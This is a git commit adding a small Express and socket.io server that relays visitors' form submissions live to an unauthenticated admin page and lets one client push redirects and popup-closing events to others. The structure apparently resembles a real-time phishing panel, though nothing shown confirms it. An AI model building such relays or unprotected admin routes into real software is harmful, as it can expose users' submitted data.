e5ecfa5490ed25edbbc4825d0c11718f426bae8f
Ilyes1 <ihannouch7@gmail.com>
2024-01-02 18:02:40 +0100

    first commit

---
+++ index.js
@@ -0,0 +1,45 @@
+const express = require('express');
+const http = require('http');
+const path = require('path');
+const socketIo = require('socket.io');
+
+const app = express();
+const server = http.createServer(app);
+const io = socketIo(server);
+
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Handle root route
+app.get('/', (req, res) => {
+  // Send the index.html file
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Handle admin route
+app.get('/admin', (req, res) => {
+  // Send the admin.html file
+  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+
+io.on('connection', (socket) => {
+    console.log('A user connected');
+
+    socket.on('formSubmit', (data) => {
+        socket.broadcast.emit('updateTable', data)
+    });
+
+    socket.on('redirect', (data, url) => {
+        socket.broadcast.emit('redirect', data, url)
+    });
+
+    socket.on('finish', (data, link) => {
+        io.emit('closePopup', data, link)
+    });
+
+    socket.on('disconnect', () => {
+        console.log('User disconnected');
+    });
+});
+
+server.listen(5000)
